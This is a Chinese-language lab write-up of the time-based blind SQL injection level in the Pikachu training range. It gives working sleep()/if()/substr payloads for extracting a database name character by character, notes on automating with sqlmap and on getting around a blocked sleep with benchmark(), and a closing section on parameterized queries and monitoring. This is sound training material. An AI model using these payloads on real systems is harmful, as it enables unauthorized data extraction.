# 时间盲注(base on time) 通关笔记
> 这是最"钝"的一关：**不管输入什么，页面返回的文字一模一样。**
>
> 唯一的信号是——**响应时间。**
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | SQL-Inject → 盲注(base on time) |
| 页面地址 | `http://pikachu/vul/sqli/sqli_blind_t.php` |
| 提交方式 | GET |
| 参数名 | `name` |
| 目标 | 在没有回显、没有真假差异的情况下读数据 |

## 二、我的解题步骤
### 步骤 1：先看页面返回什么
输入 `kobe`：
```
i don't care who you are!
```
输入 `不存在的名字`：
```
i don't care who you are!
```
**完全一样。**
看源码才知道，两个分支输出的是同一句话：
```php
if($result && mysqli_num_rows($result)==1){
    while($data=mysqli_fetch_assoc($result)){
        //这里不管输入啥,返回的都是一样的信息,所以更加不好判断
        $html.="<p class='notice'>i don't care who you are!</p>";
    }
}else{
    $html.="<p class='notice'>i don't care who you are!</p>";
}
```
**布尔盲注那套"有结果 / 无结果"在这里失效了。**
### 步骤 2：改用"时间"作为信号
既然文字一样，那就让它"慢一点"：
```
kobe' and sleep(2)#
```
我实测：
| payload | 耗时 |
| --- | --- |
| `kobe' and 1=1#` | 0.05 秒 |
| `kobe' and sleep(0)#` | 0.02 秒 |
| **`kobe' and sleep(2)#`** | **2.06 秒** |
**延时生效 = 注入成立，而且能用来传信息。**
### 步骤 3：把"真假"变成"快慢"
```sql
-- 如果条件成立，就睡 2 秒
kobe' and if(条件, sleep(2), 0)#
```
比如猜数据库名长度：
```
kobe' and if(length(database())=6, sleep(2), 0)#
```
- 响应 2 秒 → 条件成立
- 响应很快 → 条件不成立
### 步骤 4：一位一位地读
```sql
-- 第 1 个字符的 ASCII 是不是 112（p）
kobe' and if(ascii(substr(database(),1,1))=112, sleep(2), 0)#
```
配合二分法：
```
>64 ?  >96 ?  >112 ?  ...
```
**和布尔盲注的逻辑一模一样，只是把"看页面"换成"看秒表"。**

## 三、原理分析
### 3.1 源码
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    $result=mysqli_query($link, $query);//mysqi_query不打印错误描述
//    $html.="<p class='notice'>i don't care who you are!</p>";
    if($result && mysqli_num_rows($result)==1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断
            $html.="<p class='notice'>i don't care who you are!</p>";
        }
    }else{
        $html.="<p class='notice'>i don't care who you are!</p>";
    }
}
```
### 3.2 为什么必须用时间
| 关卡 | 可用信号 |
| --- | --- |
| 普通注入 | 页面显示的数据 |
| 布尔盲注 | 有结果 / 无结果 |
| **时间盲注** | **响应快 / 慢** |
**当"内容"和"真假"都被堵死，只剩下"时间"这一维。**
### 3.3 `sleep()` 是怎么被执行的
```sql
select id,email from member where username='kobe' and sleep(2)#'
```
`and` 是短路求值：
- 如果 `username='kobe'` 为真 → 接着算 `sleep(2)` → **睡 2 秒**
- 如果为假 → 不执行后面的 → **不睡**
**所以"睡不睡"本身就是一个布尔值。**
### 3.4 更精确的写法
```sql
kobe' and if(条件, sleep(2), 0)#
```
`if(条件, A, B)`：条件真返回 A，假返回 B。
**这样不管前面的查询结果如何，"睡不睡"完全由条件决定。**

## 四、知识点与笔记
### 4.1 时间盲注的常用函数
| 函数 | 说明 | 特点 |
| --- | --- | --- |
| `sleep(N)` | 睡 N 秒 | MySQL 专有，最常用 |
| `benchmark(N, expr)` | 执行 N 次 | 耗 CPU，可绕过 `sleep` 被禁用 |
| `if(cond, A, B)` | 条件分支 | 配合上面两个 |
| 重查询 | `select count(*) from 大表` | 兜底 |
### 4.2 为什么要"睡 2 秒"而不是 0.1 秒
| 时间 | 问题 |
| --- | --- |
| 0.1 秒 | 网络抖动就淹没了 |
| 1 秒 | 勉强 |
| **2~5 秒** | **稳定，误判率低** |
| 10 秒 | 太慢，一个字符要几分钟 |
**实际渗透中常用 3~5 秒，取"稳定"和"效率"的平衡。**
### 4.3 时间盲注的代价
假设要读 6 位库名，每位用二分法 7 次：
```
6 × 7 = 42 次请求
每次 2 秒
≈ 84 秒
```
**如果还要读表名、列名、数据，可能要几小时。**
所以**时间盲注必须自动化**：
- sqlmap 的 `--technique=T`
- 自己写脚本
- Burp Intruder（配合响应时间列排序）
### 4.4 时间盲注的检测难点
| 难点 | 说明 |
| --- | --- |
| **误判** | 网络波动也可能慢 |
| **需要多次验证** | 至少跑 3 次确认 |
| **容易被 WAF 拦** | `sleep(` 是明显特征 |
| **日志不可见** | 页面上什么都看不出来 |
**判断标准：正常请求稳定在 50ms，注入请求稳定在 2000ms 以上。**

## 五、和布尔盲注的区别
| | 布尔盲注 | 时间盲注 |
| --- | --- | --- |
| 信号 | 页面内容不同 | **响应时间不同** |
| 前提 | 有真假差异 | **完全无差异** |
| 速度 | 较快 | **慢得多** |
| 稳定性 | 高 | 受网络影响 |
| 难度 | 中 | **高** |
**时间盲注是"最后一招"——当什么都看不到时，只能靠等。**

## 六、防御怎么写
### 6.1 参数化
```php
$stmt = $link->prepare("select id,email from member where username=?");
$stmt->bind_param('s', $name);
$stmt->execute();
```
**参数化之后，`sleep(2)` 只是字符串的一部分，不会被执行。**
### 6.2 禁用危险函数（辅助）
```sql
-- 部分 MySQL 版本可以限制
-- 或在应用层禁用
```
**但这只是提高门槛，不是根治。**
### 6.3 超时控制
```php
$link->options(MYSQLI_OPT_CONNECT_TIMEOUT, 3);
```
**让查询超时，时间盲注的"睡眠"就没法用了。**
### 6.4 监控异常耗时
| 指标 | 告警 |
| --- | --- |
| 单个请求耗时 > 1s | 记录 |
| 同一 IP 高频长耗时 | 告警 |
| `sleep` 出现频率 | 直接封禁 |
**时间盲注的特征太明显了——"稳定地慢"就是信号。**

## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 什么信号都没有时，用时间 |
| 判断 | `and sleep(2)#` 响应 2 秒 |
| 实测 | 正常 0.05s，注入 2.06s |
| 核心函数 | `sleep()`、`if()`、`benchmark()` |
| 修复 | 参数化 + 查询超时 |
**一句话**：
> **时间盲注是"最笨但最万能"的方法——只要它能执行 SQL，你就能用秒表把数据读出来。**
